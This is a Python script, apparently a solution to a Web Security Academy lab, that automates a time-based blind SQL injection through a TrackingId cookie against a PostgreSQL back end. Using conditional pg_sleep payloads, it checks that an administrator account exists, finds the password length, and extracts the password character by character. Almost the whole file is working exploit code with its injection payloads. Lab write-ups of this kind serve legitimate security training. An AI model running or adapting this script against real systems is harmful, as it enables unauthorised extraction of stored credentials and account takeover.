#!/usr/bin/env python3

import requests
import urllib
from string import digits, ascii_letters


url = 'https://0a3200bd039931fe80ab12ed005e0034.web-security-academy.net/login'

session = requests.Session()

TRACKING_COOKIE = 'c52fX0J6cIAZpMPn'
cookies = {
    "TrackingId": f"{TRACKING_COOKIE}'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END----"
}

# response = session.get(url, cookies=cookies)
# print(response.status_code)
# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')

# Now we know that the time delay is based on whether the condition is true or not
# if our conditions are true, we trigger a delay, else we don't

# we can do a LOOOOT of fun things using this vulnerability
# let's test if the user 'administrator' exists


cookies = {
    "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (COUNT(username) > 0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
}

# URL encode the cookies
encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}

# response = session.get(url, cookies=encoded_cookies)
# print(response.status_code)
# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')


# we just figured out that there is at least one row with the username equal to admin
# now, let's find out the length of the password
# since the lab is asking us to leak the password and login


cookies = {
    "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
}
# URL encode the cookies
encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}


# response = session.get(url, cookies=encoded_cookies)
# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')


# the length is indeed 20 chars, now we have to leak the password
# for that we'll create a for loop to iterate over each sub string of the pwd
# and test each position to a possible set of characters

pool = digits + ascii_letters

# this pwd variable is to store the found password
pwd = ''


# this will go from 0 to 19
for i in range(20):
    for letter in pool:
        cookies = {
            "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (SUBSTRING(password, {i+1}, 1) = '{letter}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
        }
        encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}

        response = session.get(url, cookies=encoded_cookies)
        duration = response.elapsed.total_seconds()

        if duration > 5:
            pwd += letter
            break

print(f'PASSWORD: {pwd}')


